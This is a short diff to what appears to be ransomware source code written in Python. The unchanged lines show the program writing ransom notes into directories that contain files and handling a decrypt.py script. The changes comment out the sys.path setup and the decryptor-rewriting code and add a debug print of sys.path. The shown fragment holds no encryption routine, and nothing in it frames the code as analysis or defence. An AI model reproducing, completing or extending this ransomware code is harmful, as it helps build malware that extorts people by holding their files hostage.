@@ -148,11 +148,11 @@ class Program():
             script_content = decryptor_file.read()
 
 
-        if self.__system__ == "Windows":
-            import sys
-            current_dir = os.path.dirname(os.path.abspath(__file__))
-            print("Adding " + current_dir + " to sys.path")
-            sys.path.append(current_dir)
+        # if self.__system__ == "Windows":
+        #     import sys
+        #     current_dir = os.path.dirname(os.path.abspath(__file__))
+        #     print("Adding " + current_dir + " to sys.path")
+        #     sys.path.append(current_dir)
 
         for dir in self.__directories_with_files:
             self.__create_ransomnote_file(dir, content)
@@ -218,13 +218,16 @@ class Program():
     def __test_function(self, path):
         cwd = os.getcwd()
 
-        with open("decrypt.py", "r") as decryptor_file:
-            script_content = decryptor_file.read()
+        # with open("decrypt.py", "r") as decryptor_file:
+        #     script_content = decryptor_file.read()
 
-        content = content.replace("#added_line_script", f'os.chdir(r\"{cwd.replace("\\", "/")}\")')
+        # content = content.replace("#added_line_script", f'os.chdir(r\"{cwd.replace("\\", "/")}\")')
         
-        with open(path, "w") as decryptor_file:
-            decryptor_file.write(content)
+        # with open(path, "w") as decryptor_file:
+        #     decryptor_file.write(content)
+
+        import sys
+        print(sys.path)
 
     def __cli(self):
         while self.__should_cli_run:
